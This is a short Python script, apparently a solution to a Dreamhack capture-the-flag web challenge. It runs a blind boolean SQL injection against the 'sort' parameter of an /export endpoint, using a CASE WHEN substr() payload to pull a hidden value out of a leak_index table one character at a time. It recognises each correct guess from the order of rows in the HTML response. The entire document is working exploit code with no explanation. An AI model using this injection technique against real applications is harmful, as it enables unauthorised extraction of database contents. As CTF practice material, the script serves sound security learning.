import requests
import string

url = "http://host3.dreamhack.games:19564/export"
chars = string.ascii_letters + string.digits + string.punctuation.replace("'", "")

flag = ""

for i in range(1,101):
    for j in chars:
        payload = f"CASE   WHEN substr(     (SELECT value FROM leak_index WHERE label = 'incident-marker'),     {i}, 1   ) = '{j}'   THEN id   ELSE -id END"
        r = requests.get(url, params={"sort":payload})
        print(j)

        if "<thead><tr><th>id</th><th>actor</th><th>action</th><th>document_hash</th></tr></thead><tbody><tr><td>1</td><td>guest</td>" in r.text:
            flag+=j
            print("flag : ",flag)
            break


print(flag)
 